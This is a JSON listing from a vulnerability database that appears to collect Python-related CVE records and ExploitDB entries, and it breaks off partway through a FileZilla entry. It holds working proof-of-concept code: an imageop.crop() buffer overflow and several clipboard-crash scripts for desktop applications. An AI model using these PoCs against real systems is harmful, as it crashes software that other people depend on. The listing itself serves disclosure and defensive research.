{"matches": [{"source": "CVE", "_id": "2019-16935", "description": "The documentation XML-RPC server in Python through 2.7.16, 3.x through 3.6.9, and 3.7.x through 3.7.4 has XSS via the server_title field. This occurs in Lib/DocXMLRPCServer.py in Python 2.x, and in Lib/xmlrpc/server.py in Python 3.x. If set_server_title is called with untrusted input, arbitrary JavaScript can be delivered to clients that visit the http URL for this server.", "osvdb": [], "bid": [], "cve": ["CVE-2019-16935"], "msb": []}, {"code": "Bugtraq ID: 36097\r\nClass: Input Validation Error\r\n\r\nPublished: Jan 17 2009 12:00AM\r\nUpdated: Nov 12 2009 08:06PM\r\nCredit: Peter Valchev\r\nVulnerable: SuSE openSUSE 11.0\r\nSuSE openSUSE 10.3\r\nSuSE Linux 9\r\nSuSE Linux 11\r\nSuSE Linux 
10.0\r\nRedHat Fedora 11\r\nRedHat Fedora 10\r\nRedHat Enterprise Linux WS 4\r\nRedHat Enterprise Linux WS 3\r\nRedHat Enterprise Linux ES 4\r\nRedHat Enterprise Linux ES 3\r\nRedHat Enterprise Linux AS 4\r\nRedHat Enterprise Linux AS 3\r\nRedHat Enterprise Linux Desktop version 4\r\nRedHat Desktop 3.0\r\nPython Software Foundation Python 3.0.1\r\nPython Software Foundation Python 
2.6.2\r\nPython Software Foundation Python 2.5.3\r\nPython Software Foundation Python 2.5.2 r6\r\nPython Software Foundation Python 2.5.2\r\nPython Software Foundation Python 2.5.1\r\nPython Software Foundation Python 2.4.5\r\nPython Software Foundation Python 2.4.4 r14\r\nPython Software Foundation Python 2.4.4\r\nPython Software Foundation Python 2.4.3\r\n+ Trustix Secure Linux 3.0.5\r\nPython Software Foundation Python 2.4.2\r\nPython Software Foundation Python 2.4.1\r\nPython Software Foundation Python 
2.4\r\nPython Software Foundation Python 2.3.6\r\nPython Software Foundation Python 2.3.5\r\nPython Software Foundation Python 2.3.4\r\n+ MandrakeSoft Linux Mandrake 10.1 x86_64\r\n+ MandrakeSoft Linux Mandrake 10.1\r\n+ S.u.S.E. Linux Personal 9.2 x86_64\r\n+ S.u.S.E. Linux Personal 9.2\r\n+ Ubuntu Ubuntu Linux 4.1 ppc\r\n+ Ubuntu Ubuntu Linux 4.1 ia64\r\n+ Ubuntu Ubuntu Linux 4.1 ia32\r\nPython Software Foundation Python 2.3.3\r\n+ MandrakeSoft Corporate Server 3.0 x86_64\r\n+ MandrakeSoft Corporate Server 3.0\r\n+ MandrakeSoft Linux Mandrake 10.0 AMD64\r\n+ MandrakeSoft Linux Mandrake 10.0\r\n+ MandrakeSoft Linux Mandrake 9.2 amd64\r\n+ MandrakeSoft Linux Mandrake 9.2\r\n+ S.u.S.E. Linux Personal 9.0 x86_64\r\n+ S.u.S.E. Linux Personal 9.0\r\nPython Software Foundation Python 2.3.2\r\nPython Software Foundation Python 2.3.1\r\nPython Software Foundation Python 2.3 b1\r\nPython Software Foundation Python 2.3\r\n+ S.u.S.E. Linux Personal 9.0 x86_64\r\n+ S.u.S.E. Linux Personal 9.0\r\nPython Software Foundation Python 2.2.3\r\n+ RedHat Desktop 3.0\r\n+ RedHat Enterprise Linux AS 3\r\n+ RedHat Enterprise Linux ES 3\r\n+ RedHat Enterprise Linux WS 3\r\n+ Ubuntu Ubuntu Linux 4.1 ppc\r\n+ Ubuntu Ubuntu Linux 4.1 ia64\r\n+ Ubuntu Ubuntu Linux 4.1 ia32\r\nPython Software Foundation Python 2.2.2\r\n+ OpenPKG OpenPKG 1.2\r\n+ RedHat Linux 7.3\r\n+ S.u.S.E. Linux Personal 8.2\r\nPython Software Foundation Python 2.2.1\r\n+ Debian Linux 3.0 sparc\r\n+ Debian Linux 3.0 s/390\r\n+ Debian Linux 3.0 ppc\r\n+ Debian Linux 3.0 mipsel\r\n+ Debian Linux 3.0 mips\r\n+ Debian Linux 3.0 m68k\r\n+ Debian Linux 3.0 ia-64\r\n+ Debian Linux 3.0 ia-32\r\n+ Debian Linux 3.0 hppa\r\n+ Debian Linux 3.0 arm\r\n+ Debian Linux 3.0 alpha\r\n+ Debian Linux 3.0\r\n+ Gentoo Linux 1.4 _rc1\r\n+ Gentoo Linux 1.2\r\n+ MandrakeSoft Corporate Server 2.1 x86_64\r\n+ MandrakeSoft Corporate Server 2.1\r\n+ MandrakeSoft Linux Mandrake 9.0\r\n+ OpenPKG OpenPKG 1.1\r\n+ S.u.S.E. Linux 8.1\r\nPython Software Foundation Python 2.2\r\n+ Conectiva Linux 8.0\r\n+ 
MandrakeSoft Linux Mandrake 8.2 ppc\r\n+ MandrakeSoft Linux Mandrake 8.2\r\n+ MandrakeSoft Linux Mandrake 8.1 ia64\r\n+ MandrakeSoft Linux Mandrake 8.1\r\nPython Software Foundation Python 2.1.3\r\n+ Debian Linux 3.0\r\nPython Software Foundation Python 2.1.2\r\nPython Software Foundation Python 2.1.1\r\n+ RedHat Linux 7.2\r\n+ Sun Linux 5.0.7\r\nPython Software Foundation Python 2.1\r\n+ Conectiva Linux 7.0\r\n+ Debian Linux 3.1 sparc\r\n+ Debian Linux 3.1 s/390\r\n+ Debian Linux 3.1 ppc\r\n+ Debian Linux 
3.1 mipsel\r\n+ Debian Linux 3.1 mips\r\n+ Debian Linux 3.1 m68k\r\n+ Debian Linux 3.1 ia-64\r\n+ Debian Linux 3.1 ia-32\r\n+ Debian Linux 3.1 hppa\r\n+ Debian Linux 3.1 arm\r\n+ Debian Linux 3.1 amd64\r\n+ Debian Linux 3.1 alpha\r\n+ Debian Linux 3.1\r\n+ Debian Linux 3.0 sparc\r\n+ Debian Linux 3.0 s/390\r\n+ Debian Linux 3.0 ppc\r\n+ Debian Linux 3.0 mipsel\r\n+ Debian Linux 3.0 mips\r\n+ Debian Linux 3.0 m68k\r\n+ Debian Linux 3.0 ia-64\r\n+ Debian Linux 3.0 ia-32\r\n+ Debian Linux 3.0 hppa\r\n+ Debian 
Linux 3.0 arm\r\n+ Debian Linux 3.0 alpha\r\n+ Debian Linux 3.0\r\nPython Software Foundation Python 2.0.1\r\nPython Software Foundation Python 2.0\r\n+ MandrakeSoft Linux Mandrake 8.0 ppc\r\n+ MandrakeSoft Linux Mandrake 8.0\r\nPython Software Foundation 
Python 2.5\r\nPardus Linux 2009 0\r\nPardus Linux 2008 0\r\nJames Clark Expat 2.0.1\r\nGentoo Linux\r\nNot Vulnerable: Python Software Foundation Python 3.1.1 \r\n\r\nThe Expat library is prone to a denial-of-service vulnerability because it fails to properly handle crafted XML data.\r\n\r\nExploiting this issue allows remote attackers to cause denial-of-service conditions in the context of an application using the vulnerable XML parsing library.\r\n\r\nExpat 2.0.1 is vulnerable; other versions may also be 
affected. \r\n\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/10206-1.gz (2009-11-22-36097.gz)\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/10206-2.gz (2009-11-22-36097-2.gz)", "description": "Expat 2.0.1 - UTF-8 Character XML Parsing Remote Denial of Service", "author": "Peter Valchev", "_id": 10206, "source": "ExploitDB", "platform": "linux", "date": "2009-11-12T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "Python's 'imageop' module is prone to a buffer-overflow vulnerability.\r\n\r\nSuccessful exploits may allow attackers to execute arbitrary code in the context of applications using the vulnerable Python module. This may result in a compromise of the underlying system. Failed attempts may lead to a denial-of-service condition.\r\n\r\nThis issue affects versions prior to Python 2.5.2. \r\n\r\nBugtraq ID:  \t 31976\r\nClass: \tBoundary Condition Error\r\nCVE: \tCVE-2008-4864\r\nPublished: \tOct 29 2008 12:00AM\r\nUpdated: \tNov 24 2009 07:56PM\r\nCredit: \tChris Evans\r\nVulnerable: \tVMWare vMA 4.0\r\nVMWare ESX Server 3.0.3\r\nVMWare ESX Server 2.5.5\r\nVMWare ESX Server 4.0\r\nVMWare ESX Server 3.5\r\nUbuntu Ubuntu Linux 8.10 sparc\r\nUbuntu Ubuntu Linux 8.10 powerpc\r\nUbuntu Ubuntu Linux 8.10 lpia\r\nUbuntu Ubuntu Linux 8.10 i386\r\nUbuntu Ubuntu Linux 8.10 amd64\r\nUbuntu Ubuntu Linux 8.04 LTS sparc\r\nUbuntu Ubuntu Linux 8.04 LTS powerpc\r\nUbuntu Ubuntu Linux 8.04 LTS lpia\r\nUbuntu Ubuntu Linux 8.04 LTS i386\r\nUbuntu Ubuntu Linux 8.04 LTS amd64\r\nUbuntu Ubuntu Linux 6.06 LTS sparc\r\nUbuntu Ubuntu Linux 6.06 LTS powerpc\r\nUbuntu Ubuntu Linux 6.06 LTS i386\r\nUbuntu Ubuntu Linux 6.06 LTS amd64\r\nS.u.S.E. SUSE Linux Enterprise Server 10 SP2\r\nS.u.S.E. SUSE Linux Enterprise Desktop 10 SP2\r\nS.u.S.E. SLE SDK 10 SP2\r\nS.u.S.E. openSUSE 11.1\r\nS.u.S.E. openSUSE 11.0\r\nS.u.S.E. openSUSE 10.3\r\nS.u.S.E. Open-Enterprise-Server 0\r\nS.u.S.E. Novell Linux POS 9\r\nS.u.S.E. Novell Linux Desktop 9\r\nRedHat 
Enterprise Linux WS 4\r\nRedHat Enterprise Linux WS 3\r\nRedHat Enterprise Linux ES 4\r\nRedHat Enterprise Linux ES 3\r\nRedHat 
Enterprise Linux Desktop Workstation 5 client\r\nRedHat Enterprise Linux Desktop 5 client\r\nRedHat Enterprise Linux AS 4\r\nRedHat Enterprise Linux AS 3\r\nRedHat Enterprise Linux Desktop version 4\r\nRedHat Enterprise Linux 5 server\r\nRedHat Desktop 3.0\r\nPython Software Foundation Python 2.5.1\r\nPython Software Foundation Python 2.4.5\r\nPython Software Foundation Python 2.4.4 r14\r\nPython Software Foundation Python 2.4.4\r\nPython Software Foundation Python 2.4.3\r\n+ Trustix Secure Linux 3.0.5\r\nPython Software Foundation Python 2.4.2\r\nPython Software Foundation Python 2.4.1\r\nPython Software Foundation Python 2.4\r\nPython Software Foundation Python 2.3.6\r\nPython Software Foundation Python 2.3.5\r\nPython Software Foundation Python 2.3.4\r\nPython Software Foundation Python 2.3.3\r\nPython Software Foundation Python 2.3.2\r\nPython Software Foundation Python 2.3.1\r\nPython Software Foundation Python 2.3 b1\r\nPython Software Foundation Python 2.3\r\nPython Software Foundation Python 2.2.3\r\n+ RedHat Desktop 3.0\r\n+ RedHat Enterprise Linux AS 3\r\n+ RedHat Enterprise Linux ES 3\r\n+ RedHat Enterprise Linux WS 3\r\n+ 
Ubuntu Ubuntu Linux 4.1 ppc\r\n+ Ubuntu Ubuntu Linux 4.1 ia64\r\n+ Ubuntu Ubuntu Linux 4.1 ia32\r\nPython Software Foundation Python 2.2.2\r\n+ OpenPKG OpenPKG 1.2\r\n+ RedHat Linux 7.3\r\n+ S.u.S.E. Linux Personal 8.2\r\nPython Software Foundation Python 
2.2.1\r\nPython Software Foundation Python 2.2\r\n+ Conectiva Linux 8.0\r\n+ MandrakeSoft Linux Mandrake 8.2 ppc\r\n+ MandrakeSoft Linux Mandrake 8.2\r\n+ MandrakeSoft Linux Mandrake 8.1 ia64\r\n+ MandrakeSoft Linux Mandrake 8.1\r\nPython Software Foundation Python 2.1.3\r\n+ Debian Linux 3.0\r\nPython Software Foundation Python 2.1.2\r\nPython Software Foundation Python 2.1.1\r\nPython Software Foundation Python 2.1\r\nPython Software Foundation Python 2.0.1\r\nPython Software Foundation Python 2.0\r\n+ MandrakeSoft Linux Mandrake 8.0 ppc\r\n+ MandrakeSoft Linux Mandrake 8.0\r\nPython Software Foundation Python 1.6.1\r\nPython Software Foundation Python 1.6\r\nPython Software Foundation Python 1.5.2\r\nPython Software Foundation Python 2.5\r\nMandrakeSoft Multi Network Firewall 2.0\r\nMandrakeSoft Linux Mandrake 2009.0 x86_64\r\nMandrakeSoft Linux Mandrake 2009.0\r\nMandrakeSoft Linux Mandrake 2008.1 x86_64\r\nMandrakeSoft Linux Mandrake 2008.1\r\nMandrakeSoft Linux Mandrake 2008.0 x86_64\r\nMandrakeSoft Linux Mandrake 2008.0\r\nMandrakeSoft Corporate Server 4.0 x86_64\r\nMandrakeSoft Corporate Server 3.0 x86_64\r\nMandrakeSoft Corporate Server 3.0\r\nMandrakeSoft Corporate Server 4.0\r\nApple Mac OS X Server 10.5.6\r\nApple Mac OS X Server 10.5.5\r\nApple Mac OS X Server 10.5.4\r\nApple Mac OS X Server 10.5.3\r\nApple Mac OS X Server 10.5.2\r\nApple Mac OS X Server 10.5.1\r\nApple Mac OS X Server 10.4.11\r\nApple Mac OS X Server 10.4.11\r\nApple Mac OS X Server 10.4.10\r\nApple Mac OS X Server 10.4.9\r\nApple Mac OS X Server 10.4.8\r\nApple Mac OS X Server 10.4.7\r\nApple Mac OS X Server 10.4.6\r\nApple Mac OS X Server 10.4.5\r\nApple Mac OS X Server 10.4.4\r\nApple Mac OS X Server 10.4.3\r\nApple Mac OS X Server 10.4.2\r\nApple Mac OS X Server 10.4.1\r\nApple Mac OS X Server 10.4\r\nApple Mac OS X Server 10.5\r\nApple Mac OS X 10.5.6\r\nApple Mac OS X 10.5.5\r\nApple Mac OS X 10.5.4\r\nApple Mac OS X 10.5.3\r\nApple Mac OS X 10.5.2\r\nApple Mac OS X 10.5.1\r\nApple Mac OS X 10.4.11\r\nApple Mac OS X 10.4.11\r\nApple Mac OS X 10.4.10\r\nApple Mac OS X 10.4.9\r\nApple Mac OS X 10.4.8\r\nApple Mac OS X 10.4.7\r\nApple Mac OS X 10.4.6\r\nApple Mac OS X 10.4.5\r\nApple Mac OS X 10.4.4\r\nApple Mac OS X 10.4.3\r\nApple Mac OS X 10.4.2\r\nApple Mac OS X 10.4.1\r\nApple Mac OS X 10.4\r\nApple Mac OS X 10.5\r\nNot Vulnerable: \tVMWare vMA 4.0 Patch 2\r\nPython Software Foundation Python 2.5.2 \r\n\r\nPOC:\r\n\r\nimport imageop\r\ns = ''\r\nimageop.crop(s, 1, 65536, 65536, 0, 0, 65536, 65536)", "description": "Python < 2.5.2 Imageop Module - 'imageop.crop()' Buffer Overflow", "author": "Chris Evans", "_id": 10229, "source": "ExploitDB", "platform": "multiple", "date": "2009-11-24T00:00:00+00:00", "cve": ["CVE-2008-4864"], "type": "dos", "port": 0}, {"code": "#!/usr/bin/env python\r\n# Title : Python IDLE 2.7.8  - Crash Proof Of Concept\r\n# Website : http://www.python.org/idle/\r\n# Tested : Windows 7 / Windows 8.1\r\n#\r\n#\r\n# Author      :   Hadi Zomorodi Monavar\r\n# Email       :   zomorodihadi@gmail.com\r\n#\r\n# 1 . run python code : python poc.py\r\n# 2 . open r3z4.txt and copy content to clipboard\r\n# 3 . open \"python 2.7.8 IDLE\"\r\n# 4 . from Menu (edit --> find)\r\n# 5 . Paste ClipBoard on \"find\"\r\n# 6 . Enter\r\n# 7 . Crashed ;)\r\n\r\ncrash = \"\\x41\"*900000 #B0F\r\nfile = open(\"r3z4.txt\", \"w\")\r\nfile.write(crash)\r\nfile.close()", "description": "Python IDLE 2.7.8 - Crash (PoC)", "author": "Hadi Zomorodi Monavar", "_id": 37727, "source": "ExploitDB", "platform": "windows", "date": "2015-08-07T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"source": "CVE", "_id": "2008-4394", "description": "Multiple untrusted search path vulnerabilities in Portage before 2.1.4.5 include the current working directory in the Python search path, which allows local users to execute arbitrary code via a modified Python module that is loaded by the (1) ys-apps/portage, (2) net-mail/fetchmail, (3) app-editors/leo ebuilds, and other ebuilds.", "osvdb": [], "bid": [31670], "cve": ["CVE-2008-4394"], "msb": []}, {"source": "CVE", "_id": "2018-6353", "description": "The Python console in Electrum through 2.9.4 and 3.x through 3.0.5 supports arbitrary Python code without considering (1) social-engineering attacks in which a user pastes code that they do not understand and 
(2) code pasted by a physically proximate attacker at an unattended workstation, which makes it easier for attackers to steal Bitcoin via hook code that runs at a later time when the wallet password has been entered, a different vulnerability than CVE-2018-1000022.", "osvdb": [], "bid": [], "cve": ["CVE-2018-6353"], "msb": []}, {"source": "CVE", "_id": "2019-9740", "description": "An issue was discovered in urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3. CRLF injection is possible if the attacker controls a url parameter, as demonstrated by the first argument to urllib.request.urlopen with \\r\\n (specifically in the query string after a ? character) followed by an HTTP header or a Redis command.", "osvdb": [], "bid": [107466], "cve": ["CVE-2019-9740"], "msb": []}, {"source": "CVE", "_id": "2019-9947", "description": "An issue was discovered in urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3. CRLF injection is possible if the attacker controls a url parameter, as demonstrated by the first argument to urllib.request.urlopen with \\r\\n (specifically in the path component of a URL that lacks a ? character) followed by an HTTP header or a Redis command. This is similar to the CVE-2019-9740 query string issue.", "osvdb": [], "bid": [], "cve": ["CVE-2019-9947"], "msb": []}, {"source": "CVE", "_id": "2019-16056", "description": "An issue was discovered in Python through 2.7.16, 3.x through 3.5.7, 3.6.x through 3.6.9, and 3.7.x through 3.7.4. The email module wrongly parses email addresses that contain multiple @ characters. An application that uses the email module and implements some kind of checks on the From/To headers of a message could be tricked into accepting an email address that should be denied. An attack may be the same as in CVE-2019-11340; however, this CVE applies to Python more generally.", "osvdb": [], "bid": [], "cve": ["CVE-2019-16056"], "msb": []}, {"source": "CVE", "_id": "2019-18348", "description": "An issue was discovered in urllib2 in Python 2.x through 2.7.17 and urllib in Python 3.x through 3.8.0. CRLF injection is possible if the attacker controls a url parameter, as demonstrated by the first argument to urllib.request.urlopen with \\r\\n (specifically in the host component of a URL) followed by an HTTP header. This is similar to the CVE-2019-9740 query string issue and the CVE-2019-9947 path string issue. (This 
is not exploitable when glibc has CVE-2016-10739 fixed.)", "osvdb": [], "bid": [], "cve": ["CVE-2019-18348"], "msb": []}, {"code": "source: https://www.securityfocus.com/bid/17663/info\r\n\r\nBlender is susceptible to a Python code-execution vulnerability. This issue is due to the application's failure to properly sanitize user-supplied input before using it in a Python 'eval' statement.\r\n\r\nThis issue allows attackers to execute arbitrary Python code in the context of the user running the affected application.\r\n\r\nhttp://bugs.debian.org/cgi-bin/bugreport.cgi/exploit.bvh?bug=330895;msg=5;att=1\r\nhttp://bugs.debian.org/cgi-bin/bugreport.cgi/poc1.bvh?bug=330895;msg=5;att=3\r\nhttp://bugs.debian.org/cgi-bin/bugreport.cgi/poc2.bvh?bug=330895;msg=5;att=4", "description": "Blender 2.36 - '.BVF' File Import Python Code Execution", "author": "Joxean Koret", "_id": 27728, "source": "ExploitDB", "platform": "cgi", "date": "2006-04-24T00:00:00+00:00", "cve": [], "type": "webapps", "port": 0}, {"source": "CVE", "_id": "2013-4347", "description": "The (1) make_nonce, (2) generate_nonce, and (3) generate_verifier functions in SimpleGeo python-oauth2 uses weak random numbers to generate nonces, which makes it easier for remote attackers to guess the nonce via a brute 
force attack.", "osvdb": [], "bid": [62388], "cve": ["CVE-2013-4347"], "msb": []}, {"source": "CVE", "_id": "2016-5699", "description": "CRLF injection vulnerability in the HTTPConnection.putheader function in urllib2 and urllib in CPython (aka Python) before 2.7.10 and 3.x before 3.4.4 allows remote attackers to inject arbitrary HTTP headers via CRLF sequences in a URL.", "osvdb": [], "bid": [91226], "cve": ["CVE-2016-5699"], "msb": []}, {"source": "CVE", "_id": "2013-7440", "description": "The ssl.match_hostname function in CPython (aka Python) before 2.7.9 and 3.x before 3.3.3 does not properly handle wildcards in hostnames, which might allow man-in-the-middle attackers to spoof servers via a crafted certificate.", "osvdb": [], "bid": [74707], "cve": ["CVE-2013-7440"], "msb": []}, {"source": "CVE", "_id": "2014-1912", "description": "Buffer overflow in the socket.recvfrom_into function in Modules/socketmodule.c in Python 2.5 before 2.7.7, 3.x before 3.3.4, and 3.4.x before 3.4rc1 allows remote attackers to execute arbitrary code via a crafted string.", "osvdb": [], "bid": [65379], "cve": ["CVE-2014-1912"], "msb": []}, {"source": "CVE", "_id": "2013-7338", "description": "Python before 3.3.4 RC1 allows remote attackers to cause a denial of service (infinite 
loop and CPU consumption) via a file size value larger than the size of the zip file to the (1) ZipExtFile.read, (2) ZipExtFile.read(n), (3) ZipExtFile.readlines, (4) ZipFile.extract, or (5) ZipFile.extractall function.", "osvdb": [], "bid": [65179], "cve": ["CVE-2013-7338"], "msb": []}, {"source": "CVE", "_id": "2016-5636", "description": "Integer overflow in the get_data function in zipimport.c in CPython (aka Python) before 2.7.12, 3.x before 3.4.5, and 3.5.x before 3.5.2 allows remote attackers to have 
unspecified impact via a negative data size value, which triggers a heap-based buffer overflow.", "osvdb": [], "bid": [91247], "cve": ["CVE-2016-5636"], "msb": []}, {"source": "CVE", "_id": "2018-14649", "description": "It was found that ceph-isci-cli package as shipped by Red Hat Ceph Storage 2 and 3 is using python-werkzeug in debug shell mode. This is done by setting debug=True 
in file /usr/bin/rbd-target-api provided by ceph-isci-cli package. This allows unauthenticated attackers to access this debug shell and escalate privileges. Once an attacker has successfully connected to this debug shell they will be able to execute arbitrary commands remotely. These commands will run with the same privileges as of user executing the application which is using python-werkzeug with debug shell mode enabled. In - Red Hat Ceph Storage 2 and 3, ceph-isci-cli package runs python-werkzeug library with root level permissions.", "osvdb": [], "bid": [105434], "cve": ["CVE-2018-14649"], "msb": []}, {"code": "#!/usr/bin/python\r\n# -*- coding: cp1252 -*-\r\n# Exploit Title: Angry IP Scanner 3.5.3 Denial of Service (PoC)\r\n# Author: Fernando Cruz\r\n# 
Date: 13/12/2018\r\n# Vendor Homepage: https://angryip.org\r\n# Tested Version: 3.11\r\n# Tested on Windows 10 Pro, 64-bit\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python angryip.py\r\n# 2.- Open angryip.txt and copy content to clipboard\r\n# 3.- Open Angry IP Scanner\r\n# 4.- Go to \"Herramientas\" in toolbar, click on \"Preferencias\", then in the tap \"Mostrar\",\r\n# 5.- Paste ClipBoard on \"El valor no est\u00e1 disponible (sin resultados):\", and click on \"OK\",\r\n# 6.- Crashed\r\n\r\nbuffer = \"\\x41\" * 44455293\r\nf = open(\"angryip.txt\" , 'w')\r\nf.write(buffer)\r\nf.close()", "description": "Angry IP Scanner 3.5.3 - Denial of Service (PoC)", "author": "Fernando Cruz", "_id": 45993, "source": "ExploitDB", "platform": "windows", "date": "2018-12-14T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: NetworkSleuth 3.0.0.0 - 'Key' Denial of Service (PoC)\r\n# Discovery by: Luis Martinez\r\n# Discovery Date: 2018-12-27\r\n# Vendor Homepage: www.nsauditor.com\r\n# Software Link : http://www.nsauditor.com/downloads/networksleuth_setup.exe\r\n# Tested Version: 3.0.0.0\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python NetworkSleuth_3.0.0.0.py\r\n# 2.- Open NetworkSleuth_3.0.0.0.txt and copy content to clipboard\r\n# 3.- Open NetworkSleuth\r\n# 4.- Register -> Enter Registration Code...\r\n# 5.- Name: -> l4m5\r\n# 6.- Paste ClipBoard on \"Key:\"\r\n# 7.- OK\r\n# 8.- Crashed\r\n\r\n#!/usr/bin/env python\r\n \r\nbuffer = \"\\x41\" * 276\r\nf = open (\"NetworkSleuth_3.0.0.0.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "NetworkSleuth 3.0.0.0 - 'Key' Denial of Service (PoC)", 
"author": "Luis Mart\u00ednez", "_id": 46069, "source": "ExploitDB", "platform": "windows_x86-64", "date": "2019-01-02T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: SkypeApp 12.8.487.0 - 'Cuenta de Skype o Microsoft' Denial of Service (PoC)\r\n# Discovery by: Luis Martinez\r\n# Discovery Date: 2018-08-23\r\n# Vendor Homepage: https://www.skype.com/es/home/\r\n# Tested Version: 12.8.487.0\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 
Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python SkypeApp_12.8.487.0.py\r\n# 2.- Open SkypeApp_12.8.487.0.txt and copy content to clipboard\r\n# 3.- Open SkypeApp.exe\r\n# 4.- Paste ClipBoard on \"Cuenta de Skype o Microsoft\"\r\n# 5.- Siguiente\r\n# 6.- Crashed\r\n\r\n#!/usr/bin/env python\r\n \r\nbuffer = \"\\x41\" * 65225\r\nf = open (\"SkypeApp_12.8.487.0.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "SkypeApp 12.8.487.0 - 'Cuenta de Skype o Microsoft' 
Denial of Service (PoC)", "author": "Luis Mart\u00ednez", "_id": 45251, "source": "ExploitDB", "platform": "windows_x86-64", "date": "2018-08-24T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "#!/usr/bin/env python\r\n# Title : Acunetix Web Vulnerability Scanner 9.5 - Crash Proof Of Concept\r\n# Website : https://www.acunetix.com\r\n# Tested : win 7 / win 8.1 / win vista\r\n#\r\n#\r\n# Author      :   Hadi Zomorodi Monavar\r\n# Email       :   zomorodihadi@gmail.com\r\n#\r\n# 1 . run python code : python poc.py\r\n# 2 . open hadi.txt and copy content to clipboard\r\n# 3 . open \"Acunetix Web Vulnerability Scanner 9.5\"\r\n# 4 . from Tools Explorer --> subdomain scanner\r\n# 5 . Paste ClipBoard on \"Domain\"\r\n# 6 . Click start\r\n# 7 . Crashed ;)\r\n\r\ncrash = \"\\x41\"*9000 #B0F\r\nfile = open(\"hadi.txt\", \"w\")\r\nfile.write(crash)\r\nfile.close()", "description": "Acunetix Web Vulnerability Scanner 9.5 - Crash (PoC)", "author": "Hadi Zomorodi Monavar", "_id": 37719, "source": "ExploitDB", "platform": "windows", "date": "2015-07-31T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: ipPulse 1.92 - 'Enter Key' Denial of Service (PoC)\r\n# Discovery by: Diego Buztamante\r\n# Discovery Date: 2019-11-18\r\n# Vendor Homepage: https://www.netscantools.com/ippulseinfo.html\r\n# Software Link : http://download.netscantools.com/ipls192.zip\r\n# Tested Version: 1.92\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run python code : python ipPulse_1.92.py\r\n# 2.- Open ipPulse_1.92.txt and copy content to clipboard\r\n# 3.- Open ippulse.exe\r\n# 4.- Click on \"Enter Key\"\r\n# 5.- Paste ClipBoard on \"Name: \"\r\n# 6.- OK\r\n# 7.- Crashed\r\n\r\n#!/usr/bin/env python\r\n\r\nbuffer = \"\\x41\" * 256\r\nf = open (\"ipPulse_1.92.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "ipPulse 1.92 - 'Enter Key' Denial of Service (PoC)", "author": "Diego Armando Buztamante Rico", "_id": 47674, "source": "ExploitDB", "platform": "windows", "date": "2019-11-19T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: BlueAuditor 1.7.2.0 - 'Key' Denial of Service (PoC)\r\n# Discovery by: Luis Martinez\r\n# Discovery Date: 2019-01-04\r\n# Vendor Homepage: www.nsauditor.com\r\n# Software Link : http://www.nsauditor.com/downloads/blueauditor_setup.exe\r\n# Tested Version: 1.7.2.0\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python BlueAuditor_1.7.2.0.py\r\n# 2.- Open BlueAuditor_1.7.2.0.txt and copy content to clipboard\r\n# 3.- Open BlueAuditor\r\n# 4.- Register -> Enter Registration Code...\r\n# 5.- Name: -> l4m5\r\n# 6.- Paste ClipBoard on \"Key:\"\r\n# 7.- OK\r\n# 8.- Crashed\r\n\r\n#!/usr/bin/env python\r\n \r\nbuffer = \"\\x41\" * 256\r\nf = open (\"BlueAuditor_1.7.2.0.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "BlueAuditor 
1.7.2.0 - 'Key' Denial of Service (PoC)", "author": "Luis Mart\u00ednez", "_id": 46087, "source": "ExploitDB", "platform": "windows", "date": "2019-01-07T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"source": "CVE", "_id": "2008-3143", "description": "Multiple integer overflows in Python before 2.5.2 might allow context-dependent attackers to have an unknown impact via vectors related to (1) Include/pymem.h; (2) _csv.c, (3) _struct.c, (4) arraymodule.c, (5) audioop.c, (6) binascii.c, (7) cPickle.c, (8) cStringIO.c, (9) cjkcodecs/multibytecodec.c, (10) datetimemodule.c, (11) md5.c, (12) rgbimgmodule.c, and (13) stropmodule.c in Modules/; (14) bufferobject.c, (15) listobject.c, and (16) obmalloc.c in Objects/; (17) Parser/node.c; and (18) asdl.c, (19) ast.c, (20) bltinmodule.c, and (21) compile.c in Python/, as addressed by \"checks for integer overflows, contributed by Google.\"", "osvdb": [], "bid": [30491], "cve": ["CVE-2008-3143"], "msb": []}, {"code": "# Exploit Title: FileZilla 3.40.0 - \"Local search\" Denial of Service (PoC)\r\n# Discovery by: Mr Winst0n\r\n# Discovery Date: February 20, 2019\r\n# Vendor Homepage: https://filezilla-project.org\r\n# Software Link : https://filezilla-project.org/download.php?type=client&show_all=1\r\n# Tested Version: 3.40.0\r\n# Tested on: Kali linux x86_64\r\n# Vulnerability Type: Denial of Service (DoS)\r\n\r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run python code : python filezilla.py\r\n# 2.- Open buff.txt and copy content to clipboard\r\n# 3.- Open Filezilla (located in bin folder), in top bar click on Binoculars icon (search for files recursively)\r\n# 4.- In the opend window, 
